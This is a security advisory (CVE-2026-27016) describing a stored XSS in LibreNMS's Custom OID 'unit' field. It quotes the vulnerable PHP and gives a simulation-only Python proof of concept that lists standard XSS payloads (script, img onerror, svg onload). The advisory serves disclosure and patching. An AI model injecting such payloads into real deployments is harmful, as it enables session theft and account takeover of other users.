# [M] LibreNMS has a Stored XSS in Custom OID - unit parameter missing strip_tags()

## Summary
Severity: Medium
Advisory: GHSA-fqx6-693c-f55g
CVE: CVE-2026-27016
CWE: CWE-116, CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-18
Source: https://github.com/advisories/GHSA-fqx6-693c-f55g
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=24.10.0 <26.2.0

## Details
### Summary
The `unit` parameter in Custom OID functionality lacks `strip_tags()` sanitization while other fields (`name`, `oid`, `datatype`) are sanitized. The unsanitized value is stored in the database and rendered without HTML escaping, allowing Stored XSS.

### Details
**Vulnerable Input Processing (`includes/html/forms/customoid.inc.php` lines 18-21):**
```php
$name = strip_tags((string) $_POST['name']);       // line 18 - SANITIZED
$oid = strip_tags((string) $_POST['oid']);         // line 19 - SANITIZED
$datatype = strip_tags((string) $_POST['datatype']);  // line 20 - SANITIZED
$unit = $_POST['unit'];                            // line 21 - NOT SANITIZED!
```

**Vulnerable Output (`graphs/customoid.inc.php` lines 13-20):**
```php
$customoid_unit = $customoid['customoid_unit'];  // Retrieved from DB
$customoid_current = \LibreNMS\Util\Number::formatSi(...) . $customoid_unit;
echo "...$customoid_current...";  // ECHOED WITHOUT ESCAPING!
```

### PoC

```python
#!/usr/bin/env python3
"""
XSS test for LibreNMS Custom OID - unit parameter
"""

import html as html_module
import re

def strip_tags(value):
    return re.sub(r'<[^>]*?>', '', str(value))

# Simulate form processing (customoid.inc.php lines 18-21)
test_inputs = {
    'name': '<script>alert(1)</script>Test OID',
    'oid': '1.3.6.1.4.1.2021.10.1.3.1',
    'datatype': 'GAUGE',
    'unit': '<script>alert("XSS")</script>',
}

name = strip_tags(test_inputs['name'])      # Sanitized
oid = strip_tags(test_inputs['oid'])        # Sanitized
datatype = strip_tags(test_inputs['datatype'])  # Sanitized
unit = test_inputs['unit']                   # NOT SANITIZED!

print("Input Processing Analysis:")
print(f"  name (strip_tags):     {name}")
print(f"  oid (strip_tags):      {oid}")
print(f"  datatype (strip_tags): {datatype}")
print(f"  unit (NO strip_tags):  {unit}")
print()
print("*** VULNERABILITY: 'unit' parameter has NO strip_tags()! ***")

# Test XSS payloads
payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
]

print("\nXSS Payload Tests:")
for payload in payloads:
    escaped = html_module.escape(payload)
    has_xss = '<script>' in payload or 'onerror=' in payload.lower()
    print(f"  Payload: {payload}")
    print(f"    Raw (vulnerable): Contains executable code: {has_xss}")
    print(f"    Escaped (safe):   {escaped}")
```

### Expected Output

```
Input Processing Analysis:
  name (strip_tags):     alert(1)Test OID
  oid (strip_tags):      1.3.6.1.4.1.2021.10.1.3.1
  datatype (strip_tags): GAUGE
  unit (NO strip_tags):  <script>alert("XSS")</script>

*** VULNERABILITY: 'unit' parameter has NO strip_tags()! ***
```
### Impact
- **Attack Vector:** User with device edit permissions sets malicious Unit value
- **Exploitation:** XSS payload stored in database, executes for all users viewing device graphs
- **Consequences:**
  - Session hijacking via cookie theft
  - Admin account takeover
  - Malicious actions on behalf of victims
  - Persistent attack affecting all users
- **Affected Users:** All LibreNMS installations with Custom OID feature

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-fqx6-693c-f55g
- https://nvd.nist.gov/vuln/detail/CVE-2026-27016
- https://github.com/librenms/librenms/pull/19040
- https://github.com/librenms/librenms/commit/3bea263e02441690c01dea7fa3fe6ffec94af335
- https://github.com/librenms/librenms
- https://github.com/librenms/librenms/releases/tag/26.2.0
